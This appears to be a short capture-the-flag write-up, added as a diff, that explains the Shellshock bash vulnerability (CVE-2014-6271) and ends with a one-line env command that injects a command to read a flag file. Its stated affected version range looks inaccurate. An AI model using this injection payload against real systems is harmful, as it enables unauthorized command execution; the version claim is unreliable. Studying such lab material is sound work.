@@ -1,0 +1,10 @@
+###Good old shellshock
+###Shellshock CVE-2014-6271 is a vulnerability found in bash(1.0.3–2.05b)
+###It started in bash evaluating environment variables as functions upon startup
+###The problem is that the evaluation does not stop at the end of function declarement
+###Thus, if a function looked like '() { :;}; echo shocked'
+###The parser will continue evaluating after the useless func and echo shocked
+###This results in command injection if attackers can control the environment variables upon starting bash
+
+###env executes command with given environment variables
+env exp='() { :;}; /bin/cat flag' ./shellshock
